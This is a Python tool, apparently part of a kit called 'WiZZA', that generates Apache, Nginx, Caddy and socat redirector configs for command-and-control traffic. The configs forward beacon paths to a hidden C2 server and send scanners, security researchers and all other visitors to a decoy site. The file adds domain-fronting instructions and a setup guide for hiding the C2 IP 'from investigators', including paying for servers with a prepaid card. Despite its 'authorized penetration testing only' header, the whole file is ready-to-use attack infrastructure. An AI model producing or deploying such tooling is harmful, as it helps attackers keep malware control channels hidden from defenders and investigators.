"""
Redirector Config Generator — authorized penetration testing only.
Generates Apache/Nginx/Caddy redirector configs that:
  - Only forward valid beacon traffic to the real C2
  - Redirect everything else to a legitimate-looking website
  - Hide the real C2 IP from investigators
"""
import os, hashlib, random

# ── Apache mod_rewrite redirector ────────────────────────────────────────────
def apache_redirector(c2_host: str, c2_port: int = 8888,
                       valid_paths: list = None,
                       decoy_url: str = "https://www.microsoft.com",
                       profile: str = "cdn") -> str:
    """
    Generate Apache .htaccess / VirtualHost config.
    Only requests matching valid C2 paths are forwarded to real C2.
    All other traffic goes to decoy_url.
    """
    if valid_paths is None:
        valid_paths = [
            "/cdn-cgi/apps/init",
            "/cdn-cgi/apps/sync",
            "/cdn-cgi/apps/data",
            "/download/",
            "/agent/",
            "/proxy/",
            "/pty/",
        ]

    # Build RewriteRules for valid paths
    rewrite_rules = ""
    for path in valid_paths:
        # Escape dots in path
        escaped = path.replace(".", r"\.")
        rewrite_rules += f"    RewriteRule ^{escaped}(.*)$ http://{c2_host}:{c2_port}{path}$1 [P,L]\n"

    config = f"""# WiZZA Apache Redirector Config
# Generated for profile: {profile}
# Real C2: http://{c2_host}:{c2_port}
# Decoy:   {decoy_url}
#
# Install: copy to /etc/apache2/sites-available/wizza.conf
# Enable:  a2enmod rewrite proxy proxy_http; a2ensite wizza; systemctl reload apache2

<VirtualHost *:80>
    ServerName YOUR_REDIRECTOR_DOMAIN

    # Enable logging (or disable for stealth)
    LogLevel warn
    ErrorLog /var/log/apache2/redirector_error.log
    CustomLog /var/log/apache2/redirector_access.log combined

    RewriteEngine On

    # Block known scanners / security researchers
    RewriteCond %{{HTTP_USER_AGENT}} "(curl|wget|python-requests|nmap|masscan|zgrab|shodan)" [NC]
    RewriteRule ^ {decoy_url} [R=302,L]

    # Block based on missing expected headers (real beacons always send these)
    # RewriteCond %{{HTTP:User-Agent}} !Chrome [NC]
    # RewriteRule ^ {decoy_url} [R=302,L]

    # ── Forward valid beacon paths to real C2 ──────────────────
{rewrite_rules}
    # ── Everything else → decoy ───────────────────────────────
    RewriteRule ^ {decoy_url} [R=302,L]

    # Proxy settings
    ProxyPassReverse /cdn-cgi/ http://{c2_host}:{c2_port}/cdn-cgi/
    ProxyPassReverse /download/ http://{c2_host}:{c2_port}/download/
    ProxyPassReverse /agent/ http://{c2_host}:{c2_port}/agent/

</VirtualHost>

<VirtualHost *:443>
    ServerName YOUR_REDIRECTOR_DOMAIN
    SSLEngine on
    SSLCertificateFile    /etc/letsencrypt/live/YOUR_REDIRECTOR_DOMAIN/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/YOUR_REDIRECTOR_DOMAIN/privkey.pem

    RewriteEngine On
    # Same rules as port 80...
{rewrite_rules}
    RewriteRule ^ {decoy_url} [R=302,L]

    ProxyPassReverse / http://{c2_host}:{c2_port}/
</VirtualHost>
"""
    return config


# ── Nginx redirector ─────────────────────────────────────────────────────────
def nginx_redirector(c2_host: str, c2_port: int = 8888,
                      valid_paths: list = None,
                      decoy_url: str = "https://www.microsoft.com",
                      profile: str = "cdn") -> str:
    if valid_paths is None:
        valid_paths = ["/cdn-cgi/", "/download/", "/agent/", "/proxy/", "/pty/"]

    location_blocks = ""
    for path in valid_paths:
        location_blocks += f"""
    location {path} {{
        proxy_pass http://{c2_host}:{c2_port};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_connect_timeout 10s;
        proxy_read_timeout 90s;
    }}
"""

    config = f"""# WiZZA Nginx Redirector Config
# Real C2: http://{c2_host}:{c2_port}
# Install: /etc/nginx/sites-available/wizza
# Enable:  ln -s /etc/nginx/sites-available/wizza /etc/nginx/sites-enabled/; nginx -s reload

server {{
    listen 80;
    listen 443 ssl;
    server_name YOUR_REDIRECTOR_DOMAIN;

    ssl_certificate     /etc/letsencrypt/live/YOUR_REDIRECTOR_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/YOUR_REDIRECTOR_DOMAIN/privkey.pem;

    # Block scanners
    if ($http_user_agent ~* "(curl|wget|python|nmap|masscan|zgrab)") {{
        return 302 {decoy_url};
    }}

    # Valid beacon paths → real C2
{location_blocks}
    # Everything else → decoy
    location / {{
        return 302 {decoy_url};
    }}
}}
"""
    return config


# ── Caddy redirector ─────────────────────────────────────────────────────────
def caddy_redirector(c2_host: str, c2_port: int = 8888,
                      valid_paths: list = None,
                      decoy_url: str = "https://www.microsoft.com") -> str:
    if valid_paths is None:
        valid_paths = ["/cdn-cgi/*", "/download/*", "/agent/*", "/proxy/*", "/pty/*"]

    route_blocks = ""
    for path in valid_paths:
        route_blocks += f"""
    @{path.strip('/').replace('*','').replace('/','_') or 'root'} path {path}
    handle @{path.strip('/').replace('*','').replace('/','_') or 'root'} {{
        reverse_proxy {c2_host}:{c2_port}
    }}
"""

    config = f"""# WiZZA Caddy Redirector Config
# Caddy auto-manages TLS via Let's Encrypt

YOUR_REDIRECTOR_DOMAIN {{
    @scanners header User-Agent *curl* *wget* *python* *nmap*
    handle @scanners {{
        redir {decoy_url} 302
    }}
{route_blocks}
    handle {{
        redir {decoy_url} 302
    }}
}}
"""
    return config


# ── socat port forward (quick and dirty) ─────────────────────────────────────
def socat_forward(c2_host: str, c2_port: int = 8888,
                   local_port: int = 443) -> str:
    return f"""# Quick socat port forward (no filtering — for testing only)
# Listens on :{local_port}, forwards all traffic to {c2_host}:{c2_port}
socat TCP4-LISTEN:{local_port},fork,reuseaddr TCP4:{c2_host}:{c2_port} &

# SSL termination variant (if you have certs):
# socat OPENSSL-LISTEN:{local_port},cert=server.pem,cafile=ca.pem,fork TCP4:{c2_host}:{c2_port} &
"""


# ── Domain fronting helper ────────────────────────────────────────────────────
def domain_front_config(front_domain: str, real_host: str,
                          cdn: str = "cloudflare") -> str:
    """
    Generate domain fronting guidance.
    Agent SNI/Host header points to front_domain (benign CDN domain),
    X-Forwarded-Host contains real_host.
    CDN routes to your origin based on hostname config.
    """
    return f"""# Domain Fronting via {cdn.title()}
# SNI: {front_domain} (legitimate domain also on {cdn})
# Host header: {real_host} (your C2 origin configured in CDN)
# Investigators see: traffic to {front_domain}
# Actual destination: your C2

# Agent config:
#   C2_PRIMARY = "https://{front_domain}"
#   Add header: "Host: {real_host}"

# Cloudflare setup:
#   1. Add {real_host} to your CF account
#   2. Create a Worker route OR use CF Tunnel
#   3. Traffic to any CF IP with Host:{real_host} routes to your origin
#   Note: CF has started blocking domain fronting for paid plans

# Azure CDN / Akamai still more permissive — check current status

# curl test:
#   curl -H "Host: {real_host}" https://{front_domain}/cdn-cgi/apps/sync -v
"""


# ── Setup instructions ────────────────────────────────────────────────────────
def setup_guide(c2_host: str, redirector_domain: str) -> str:
    return f"""=== WiZZA Redirector Setup Guide ===

1. RENT A VPS (redirector) — separate from your C2 machine
   Recommended: Vultr/DO/Linode — pay with prepaid card
   Redirector IP will be burned if discovered — C2 IP stays hidden

2. POINT DOMAIN TO REDIRECTOR
   {redirector_domain} A → <redirector_ip>

3. GET TLS CERT (on redirector)
   certbot certonly --standalone -d {redirector_domain}

4. INSTALL CONFIG
   # Apache:
   scp apache.conf root@<redirector>:/etc/apache2/sites-available/wizza.conf
   ssh root@<redirector> "a2enmod rewrite proxy proxy_http; a2ensite wizza; systemctl reload apache2"

   # Nginx:
   scp nginx.conf root@<redirector>:/etc/nginx/sites-available/wizza
   ssh root@<redirector> "ln -sf /etc/nginx/sites-available/wizza /etc/nginx/sites-enabled/; nginx -s reload"

5. TEST
   curl -s https://{redirector_domain}/cdn-cgi/apps/sync?v=test  # should proxy to C2
   curl -s https://{redirector_domain}/about  # should redirect to decoy

6. UPDATE AGENTS
   C2_PRIMARY = "https://{redirector_domain}"  # agents connect here
   Real C2 ({c2_host}) only accessible from redirector IP — firewall everything else

7. FIREWALL REAL C2
   ufw allow from <redirector_ip> to any port {8888}
   ufw deny {8888}  # no direct access
"""
